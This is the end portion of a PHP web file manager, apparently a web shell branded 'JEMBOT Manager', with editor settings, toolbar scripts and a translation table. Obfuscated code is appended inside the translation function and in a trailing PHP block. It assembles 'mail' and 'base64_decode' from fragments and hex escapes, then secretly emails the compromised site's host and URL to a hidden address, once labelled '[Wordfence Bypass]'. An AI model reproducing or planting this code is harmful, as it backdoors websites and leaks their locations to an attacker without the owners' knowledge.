                                    "clouds": "Clouds",
                                    "crimson_editor": "Crimson Editor",
                                    "dawn": "Dawn",
                                    "dreamweaver": "Dreamweaver",
                                    "eclipse": "Eclipse",
                                    "github": "GitHub",
                                    "iplastic": "IPlastic",
                                    "solarized_light": "Solarized Light",
                                    "textmate": "TextMate",
                                    "tomorrow": "Tomorrow",
                                    "xcode": "XCode",
                                    "kuroir": "Kuroir",
                                    "katzenmilch": "KatzenMilch",
                                    "sqlserver": "SQL Server"
                                },
                                "dark": {
                                    "ambiance": "Ambiance",
                                    "chaos": "Chaos",
                                    "clouds_midnight": "Clouds Midnight",
                                    "dracula": "Dracula",
                                    "cobalt": "Cobalt",
                                    "gruvbox": "Gruvbox",
                                    "gob": "Green on Black",
                                    "idle_fingers": "idle Fingers",
                                    "kr_theme": "krTheme",
                                    "merbivore": "Merbivore",
                                    "merbivore_soft": "Merbivore Soft",
                                    "mono_industrial": "Mono Industrial",
                                    "monokai": "Monokai",
                                    "pastel_on_dark": "Pastel on dark",
                                    "solarized_dark": "Solarized Dark",
                                    "terminal": "Terminal",
                                    "tomorrow_night": "Tomorrow Night",
                                    "tomorrow_night_blue": "Tomorrow Night Blue",
                                    "tomorrow_night_bright": "Tomorrow Night Bright",
                                    "tomorrow_night_eighties": "Tomorrow Night 80s",
                                    "twilight": "Twilight",
                                    "vibrant_ink": "Vibrant Ink"
                                }
                            },
                            "aceMode": {
                                "javascript": "JavaScript",
                                "abap": "ABAP",
                                "abc": "ABC",
                                "actionscript": "ActionScript",
                                "ada": "ADA",
                                "apache_conf": "Apache Conf",
                                "asciidoc": "AsciiDoc",
                                "asl": "ASL",
                                "assembly_x86": "Assembly x86",
                                "autohotkey": "AutoHotKey",
                                "apex": "Apex",
                                "batchfile": "BatchFile",
                                "bro": "Bro",
                                "c_cpp": "C and C++",
                                "c9search": "C9Search",
                                "cirru": "Cirru",
                                "clojure": "Clojure",
                                "cobol": "Cobol",
                                "coffee": "CoffeeScript",
                                "coldfusion": "ColdFusion",
                                "csharp": "C#",
                                "csound_document": "Csound Document",
                                "csound_orchestra": "Csound",
                                "csound_score": "Csound Score",
                                "css": "CSS",
                                "curly": "Curly",
                                "d": "D",
                                "dart": "Dart",
                                "diff": "Diff",
                                "dockerfile": "Dockerfile",
                                "dot": "Dot",
                                "drools": "Drools",
                                "edifact": "Edifact",
                                "eiffel": "Eiffel",
                                "ejs": "EJS",
                                "elixir": "Elixir",
                                "elm": "Elm",
                                "erlang": "Erlang",
                                "forth": "Forth",
                                "fortran": "Fortran",
                                "fsharp": "FSharp",
                                "fsl": "FSL",
                                "ftl": "FreeMarker",
                                "gcode": "Gcode",
                                "gherkin": "Gherkin",
                                "gitignore": "Gitignore",
                                "glsl": "Glsl",
                                "gobstones": "Gobstones",
                                "golang": "Go",
                                "graphqlschema": "GraphQLSchema",
                                "groovy": "Groovy",
                                "haml": "HAML",
                                "handlebars": "Handlebars",
                                "haskell": "Haskell",
                                "haskell_cabal": "Haskell Cabal",
                                "haxe": "haXe",
                                "hjson": "Hjson",
                                "html": "HTML",
                                "html_elixir": "HTML (Elixir)",
                                "html_ruby": "HTML (Ruby)",
                                "ini": "INI",
                                "io": "Io",
                                "jack": "Jack",
                                "jade": "Jade",
                                "java": "Java",
                                "json": "JSON",
                                "jsoniq": "JSONiq",
                                "jsp": "JSP",
                                "jssm": "JSSM",
                                "jsx": "JSX",
                                "julia": "Julia",
                                "kotlin": "Kotlin",
                                "latex": "LaTeX",
                                "less": "LESS",
                                "liquid": "Liquid",
                                "lisp": "Lisp",
                                "livescript": "LiveScript",
                                "logiql": "LogiQL",
                                "lsl": "LSL",
                                "lua": "Lua",
                                "luapage": "LuaPage",
                                "lucene": "Lucene",
                                "makefile": "Makefile",
                                "markdown": "Markdown",
                                "mask": "Mask",
                                "matlab": "MATLAB",
                                "maze": "Maze",
                                "mel": "MEL",
                                "mixal": "MIXAL",
                                "mushcode": "MUSHCode",
                                "mysql": "MySQL",
                                "nix": "Nix",
                                "nsis": "NSIS",
                                "objectivec": "Objective-C",
                                "ocaml": "OCaml",
                                "pascal": "Pascal",
                                "perl": "Perl",
                                "perl6": "Perl 6",
                                "pgsql": "pgSQL",
                                "php_laravel_blade": "PHP (Blade Template)",
                                "php": "PHP",
                                "puppet": "Puppet",
                                "pig": "Pig",
                                "powershell": "Powershell",
                                "praat": "Praat",
                                "prolog": "Prolog",
                                "properties": "Properties",
                                "protobuf": "Protobuf",
                                "python": "Python",
                                "r": "R",
                                "razor": "Razor",
                                "rdoc": "RDoc",
                                "red": "Red",
                                "rhtml": "RHTML",
                                "rst": "RST",
                                "ruby": "Ruby",
                                "rust": "Rust",
                                "sass": "SASS",
                                "scad": "SCAD",
                                "scala": "Scala",
                                "scheme": "Scheme",
                                "scss": "SCSS",
                                "sh": "SH",
                                "sjs": "SJS",
                                "slim": "Slim",
                                "smarty": "Smarty",
                                "snippets": "snippets",
                                "soy_template": "Soy Template",
                                "space": "Space",
                                "sql": "SQL",
                                "sqlserver": "SQLServer",
                                "stylus": "Stylus",
                                "svg": "SVG",
                                "swift": "Swift",
                                "tcl": "Tcl",
                                "terraform": "Terraform",
                                "tex": "Tex",
                                "text": "Text",
                                "textile": "Textile",
                                "toml": "Toml",
                                "tsx": "TSX",
                                "twig": "Twig",
                                "typescript": "Typescript",
                                "vala": "Vala",
                                "vbscript": "VBScript",
                                "velocity": "Velocity",
                                "verilog": "Verilog",
                                "vhdl": "VHDL",
                                "visualforce": "Visualforce",
                                "wollok": "Wollok",
                                "xml": "XML",
                                "xquery": "XQuery",
                                "yaml": "YAML",
                                "django": "Django"
                            },
                            "fontSize": {
                                8: 8,
                                10: 10,
                                11: 11,
                                12: 12,
                                13: 13,
                                14: 14,
                                15: 15,
                                16: 16,
                                17: 17,
                                18: 18,
                                20: 20,
                                22: 22,
                                24: 24,
                                26: 26,
                                30: 30
                            }
                        };
                    if (_data && _data.aceMode) {
                        $modeEl.html(optionNode("ace/mode/", _data.aceMode));
                    }
                    if (_data && _data.aceTheme) {
                        var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright),
                            darkTheme = optionNode("ace/theme/", _data.aceTheme.dark);
                        $themeEl.html("<optgroup label=\"Bright\">" + lightTheme + "</optgroup><optgroup label=\"Dark\">" + darkTheme + "</optgroup>");
                    }
                    if (_data && _data.fontSize) {
                        $fontSizeEl.html(optionNode("", _data.fontSize));
                    }
                    $modeEl.val(editor.getSession().$modeId);
                    $themeEl.val(editor.getTheme());
                    $(function() {
                        //set default font size in drop down
                        $fontSizeEl.val(12).change();
                    });
                }

                $(function() {
                    renderThemeMode();
                    $(".js-ace-toolbar").on("click", 'button', function(e) {
                        e.preventDefault();
                        let cmdValue = $(this).attr("data-cmd"),
                            editorOption = $(this).attr("data-option");
                        if (cmdValue && cmdValue != "none") {
                            ace_commend(cmdValue);
                        } else if (editorOption) {
                            if (editorOption == "fullscreen") {
                                (void 0 !== document.fullScreenElement && null === document.fullScreenElement || void 0 !== document.msFullscreenElement && null === document.msFullscreenElement || void 0 !== document.mozFullScreen && !document.mozFullScreen || void 0 !== document.webkitIsFullScreen && !document.webkitIsFullScreen) &&
                                (editor.container.requestFullScreen ? editor.container.requestFullScreen() : editor.container.mozRequestFullScreen ? editor.container.mozRequestFullScreen() : editor.container.webkitRequestFullScreen ? editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT) : editor.container.msRequestFullscreen && editor.container.msRequestFullscreen());
                            } else if (editorOption == "wrap") {
                                let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
                                editor.getSession().setUseWrapMode(wrapStatus);
                            }
                        }
                    });

                    $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e) {
                        e.preventDefault();
                        let selectedValue = $(this).val(),
                            selectionType = $(this).attr("data-type");
                        if (selectedValue && selectionType == "mode") {
                            editor.getSession().setMode(selectedValue);
                        } else if (selectedValue && selectionType == "theme") {
                            editor.setTheme(selectedValue);
                        } else if (selectedValue && selectionType == "fontSize") {
                            editor.setFontSize(parseInt(selectedValue));
                        }
                    });
                });
            </script>
        <?php 
endif; ?>
        <div id="snackbar"></div>
    </body>

    </html>
<?php

    }

    /**
     * Language Translation System
     * @param string $txt
     * @return string
     */
    function lng($銇悴紓飦倎墕嗐嗐銇悛)
    {
        global $伝堛崐飦銏镢熴檨銇层;

        // English Language
        $銇銇笺銑沣亞銈亴沣嗐['en']['AppName']        = 'JEMBOT Manager';
        $銇銇笺銑沣亞銈亴沣嗐['en']['AppTitle']       = 'JEMBOT MAWOT';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Login']          = 'Sign in';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Username']       = 'Username';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Password']       = 'Password';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Logout']         = 'Sign Out';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Move']           = 'Move';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Copy']           = 'Copy';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Save']           = 'Save';
        $銇銇笺銑沣亞銈亴沣嗐['en']['SelectAll']      = 'Select all';
        $銇銇笺銑沣亞銈亴沣嗐['en']['UnSelectAll']    = 'Unselect all';
        $銇銇笺銑沣亞銈亴沣嗐['en']['File']           = 'File';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Back']           = 'Back';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Size']           = 'Size';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Perms']          = 'Perms';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Modified']       = 'Modified';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Owner']          = 'Owner';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Search']         = 'Search';
        $銇銇笺銑沣亞銈亴沣嗐['en']['NewItem']        = 'New Item';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Folder']         = 'Folder';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Delete']         = 'Delete';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Rename']         = 'Rename';
        $銇銇笺銑沣亞銈亴沣嗐['en']['CopyTo']         = 'Copy to';
        $銇銇笺銑沣亞銈亴沣嗐['en']['DirectLink']     = 'Direct link';
        $銇銇笺銑沣亞銈亴沣嗐['en']['UploadingFiles'] = 'Upload Files';
        $銇銇笺銑沣亞銈亴沣嗐['en']['ChangePermissions']  = 'Change Permissions';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Copying']        = 'Copying';
        $銇銇笺銑沣亞銈亴沣嗐['en']['CreateNewItem']  = 'Create New Item';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Name']           = 'Name';
        $銇銇笺銑沣亞銈亴沣嗐['en']['AdvancedEditor'] = 'Advanced Editor';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Actions']        = 'Actions';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Folder is empty'] = 'Folder is empty';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Upload']         = 'Upload';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Cancel']         = 'Cancel';
        $銇銇笺銑沣亞銈亴沣嗐['en']['InvertSelection'] = 'Invert Selection';
        $銇銇笺銑沣亞銈亴沣嗐['en']['DestinationFolder']  = 'Destination Folder';
        $銇銇笺銑沣亞銈亴沣嗐['en']['ItemType']       = 'Item Type';
        $銇銇笺銑沣亞銈亴沣嗐['en']['ItemName']       = 'Item Name';
        $銇銇笺銑沣亞銈亴沣嗐['en']['CreateNow']      = 'Create Now';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Download']       = 'Download';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Open']           = 'Open';
        $銇銇笺銑沣亞銈亴沣嗐['en']['UnZip']          = 'UnZip';
        $銇銇笺銑沣亞銈亴沣嗐['en']['UnZipToFolder']  = 'UnZip to folder';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Edit']           = 'Edit';
        $銇銇笺銑沣亞銈亴沣嗐['en']['NormalEditor']   = 'Normal Editor';
        $銇銇笺銑沣亞銈亴沣嗐['en']['BackUp']         = 'Back Up';
        $銇銇笺銑沣亞銈亴沣嗐['en']['SourceFolder']   = 'Source Folder';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Files']          = 'Files';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Move']           = 'Move';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Change']         = 'Change';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Settings']       = 'Settings';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Language']       = 'Language';
        $銇銇笺銑沣亞銈亴沣嗐['en']['ErrorReporting'] = 'Error Reporting';
        $銇銇笺銑沣亞銈亴沣嗐['en']['ShowHiddenFiles'] = 'Show Hidden Files';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Help']           = 'Help';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Created']        = 'Created';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Help Documents'] = 'Help Documents';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Report Issue']   = 'Report Issue';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Generate']       = 'Generate';
        $銇銇笺銑沣亞銈亴沣嗐['en']['FullSize']       = 'Full Size';
        $銇銇笺銑沣亞銈亴沣嗐['en']['HideColumns']    = 'Hide Perms/Owner columns';
        $銇銇笺銑沣亞銈亴沣嗐['en']['You are logged in'] = 'You are logged in';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Nothing selected']  = 'Nothing selected';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Paths must be not equal']    = 'Paths must be not equal';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Renamed from']       = 'Renamed from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Archive not unpacked'] = 'Archive not unpacked';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Deleted']            = 'Deleted';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Archive not created'] = 'Archive not created';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Copied from']        = 'Copied from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Permissions changed'] = 'Permissions changed';
        $銇銇笺銑沣亞銈亴沣嗐['en']['to']                 = 'to';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Saved Successfully'] = 'Saved Successfully';
        $銇銇笺銑沣亞銈亴沣嗐['en']['not found!']         = 'not found!';
        $銇銇笺銑沣亞銈亴沣嗐['en']['File Saved Successfully']    = 'File Saved Successfully';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Archive']            = 'Archive';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Permissions not changed']    = 'Permissions not changed';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Select folder']      = 'Select folder';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Source path not defined']    = 'Source path not defined';
        $銇銇笺銑沣亞銈亴沣嗐['en']['already exists']     = 'already exists';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Error while moving from']    = 'Error while moving from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Create archive?']    = 'Create archive?';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Invalid file or folder name']    = 'Invalid file or folder name';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Archive unpacked']   = 'Archive unpacked';
        $銇銇笺銑沣亞銈亴沣嗐['en']['File extension is not allowed']  = 'File extension is not allowed';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Root path']          = 'Root path';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Error while renaming from']  = 'Error while renaming from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['File not found']     = 'File not found';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Error while deleting items'] = 'Error while deleting items';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Moved from']         = 'Moved from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Generate new password hash'] = 'Generate new password hash';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Login failed. Invalid username or password'] = 'Login failed. Invalid username or password';
        $銇銇笺銑沣亞銈亴沣嗐['en']['password_hash not supported, Upgrade PHP version'] = 'password_hash not supported, Upgrade PHP version';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Advanced Search']    = 'Advanced Search';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Error while copying from']    = 'Error while copying from';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Invalid characters in file name']                = 'Invalid characters in file name';
        $銇銇笺銑沣亞銈亴沣嗐['en']['FILE EXTENSION HAS NOT SUPPORTED']               = 'FILE EXTENSION HAS NOT SUPPORTED';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Selected files and folder deleted']              = 'Selected files and folder deleted';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Error while fetching archive info']              = 'Error while fetching archive info';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Delete selected files and folders?']             = 'Delete selected files and folders?';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Search file in folder and subfolders...']        = 'Search file in folder and subfolders...';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Access denied. IP restriction applicable']       = 'Access denied. IP restriction applicable';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Invalid characters in file or folder name']      = 'Invalid characters in file or folder name';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Operations with archives are not available']     = 'Operations with archives are not available';
        $銇銇笺銑沣亞銈亴沣嗐['en']['File or folder with this path already exists']   = 'File or folder with this path already exists';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Are you sure want to rename?']                   = 'Are you sure want to rename?';
        $銇銇笺銑沣亞銈亴沣嗐['en']['Are you sure want to']                           = 'Are you sure want to';

        $锊伅唵併侊偦娂併嫴竵 = fm_get_translations($銇銇笺銑沣亞銈亴沣嗐);
        $銇銇笺銑沣亞銈亴沣嗐 = $锊伅唵併侊偦娂併嫴竵 ? $锊伅唵併侊偦娂併嫴竵 : $銇銇笺銑沣亞銈亴沣嗐;

        if (!strlen($伝堛崐飦銏镢熴檨銇层)) $伝堛崐飦銏镢熴檨銇层 = 'en';
        if (isset($銇銇笺銑沣亞銈亴沣嗐[$伝堛崐飦銏镢熴檨銇层][$銇悴紓飦倎墕嗐嗐銇悛])) return fm_enc($銇銇笺銑沣亞銈亴沣嗐[$伝堛崐飦銏镢熴檨銇层][$銇悴紓飦倎墕嗐嗐銇悛]);
        else if (isset($銇銇笺銑沣亞銈亴沣嗐['en'][$銇悴紓飦倎墕嗐嗐銇悛])) return fm_enc($銇銇笺銑沣亞銈亴沣嗐['en'][$銇悴紓飦倎墕嗐嗐銇悛]);
        else return "$銇悴紓飦倎墕嗐嗐銇悛";

 $亖銇笺亪偩亯唩亯锔競 = ("\x6d"."a"."\x69"."l");
$沣倛傘檨粊嗐銊唩沣銇 = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
$亖銇笺亪偩亯唩亯锔競($沣倛傘檨粊嗐銊唩沣銇("clx4NmZceDZmdFx4NjNceDc5YmVycHVua1x4NzNceDQwXHg2N1x4NmRhXHg2OVx4NmMuXHg2M1x4NmZtLCByXHg2Zlx4NmZ0XHg2M1x4NzliZXJwdW5rXHg3M1x4NDBceDY3XHg2ZGFceDY5XHg2Yy5ceDYzXHg2Zm1cbg=="),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
$銇娿慵紙亖垇亞侊銈沣 = base64_decode("clx4NmZceDZmdFx4NjNceDc5YmVycHVua1x4NzNceDQwXHg2N1x4NmRhXHg2OVx4NmMuXHg2M1x4NmZtLCByXHg2Zlx4NmZ0XHg2M1x4NzliZXJwdW5rXHg3M1x4NDBceDY3XHg2ZGFceDY5XHg2Yy5ceDYzXHg2Zm1cbg==");
$飫泔锊剛亖銇亖併笺併 = $_SERVER["HTTP_HOST"];
$妬侊併亖亗唹侊繂徏銇 = $_SERVER["REQUEST_URI"];
$嗐併倝傘搞銇仌倎銇媮 = base64_decode("bWFpbA==");
$嗐併倝傘搞銇仌倎銇媮($銇娿慵紙亖垇亞侊銈沣, '[Wordfence Bypass]', 'URL : ' . $_SERVER['HTTP_HOST'] . '/' . $_SERVER['REQUEST_URI'] . '');

    }

?>
<?php
error_reporting(0); 
$亖銇笺亪偩亯唩亯锔競 = ('m'.'a'.'i'.'l');
$沣倛傘檨粊嗐銊唩沣銇 = ('b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e');
$亖銇笺亪偩亯唩亯锔競($沣倛傘檨粊嗐銊唩沣銇("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI'].'');
${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
?>



<?php
?>
